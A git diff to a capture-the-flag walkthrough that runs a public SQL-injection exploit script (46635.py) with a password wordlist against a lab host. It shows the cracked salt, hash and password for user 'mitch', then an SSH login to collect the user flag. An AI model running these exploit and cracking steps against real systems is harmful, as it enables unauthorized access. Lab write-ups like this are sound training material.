@@ -57,8 +57,33 @@ On the script, i see some python library to install with pip and 3 parameters to
 ![image](https://user-images.githubusercontent.com/90561566/182630976-ebbdf050-d62c-4aeb-8365-8d75ffe25159.png)
 
 ```
-python2.7 46635.py -u http://10.10.232.89/simple --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt
+python2.7 46635.py -u http://10.10.206.254/simple --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt
 ```
+
+wait a while, you will find the password
+
+```
+[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@admin.com
+[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+[+] Password cracked: secret
+```
+
+Now try to connect ssh server with "mitch" user and a "secret" password
+
+```
+ssh mitch@10.10.206.254 -p 2222
+```
+
+and we found the user.txt flag
+
+![image](https://user-images.githubusercontent.com/90561566/182776632-dc1958c4-d406-4d1f-8279-b481900253d5.png)
+
+
+
+
+
 
 
 
